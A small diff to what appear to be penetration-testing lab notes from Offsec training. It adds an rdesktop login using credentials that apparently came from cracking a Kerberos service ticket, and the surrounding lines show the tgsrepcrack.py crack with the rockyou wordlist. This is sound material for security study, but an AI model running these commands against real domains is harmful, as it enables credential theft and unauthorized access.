@@ -361,6 +361,9 @@ sudo apt update && sudo apt install kerberoast
 ````
 python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ````
+````
+rdesktop -u 'Allison' -p 'RockYou!' 192.168.129.59 -g 94% -d OFFSEC
+````
 ##### Powershell
 This lists current cached tickets
 ````
